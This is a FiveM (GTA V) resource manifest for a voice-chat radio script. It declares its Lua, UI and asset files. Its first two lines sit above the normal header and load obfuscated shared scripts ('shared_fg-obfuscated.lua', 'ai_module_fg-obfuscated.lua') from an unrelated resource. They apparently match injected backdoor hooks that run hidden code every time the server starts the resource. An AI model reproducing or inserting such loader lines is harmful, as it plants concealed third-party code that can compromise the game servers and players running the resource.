shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'

-- Created by Scully#5775 | https://discord.gg/eNtGFS6
fx_version 'cerulean'
game 'gta5'
author 'ELUSED HAH'
description 'ELUSED DEV - PMA-VC-RADYO'
version '1.1'
dependencies {
	'/server:5102',
	'/onesync',
}
lua54 'yes'
shared_scripts {
	'config.lua',
	'functions/*.lua'
}
client_scripts {
	'client/*.lua'
}
server_scripts {
	'server/*.lua'
}
escrow_ignore {
	'config.lua',
	'client/*.lua',
	'server/*.lua',
	'functions/*.lua'
}
ui_page 'ui/index.html'
files {
    'ui/index.html',
    'ui/*.css',
	'ui/*.js',
	'ui/images/**/*.png'
}
dependency '/assetpacks'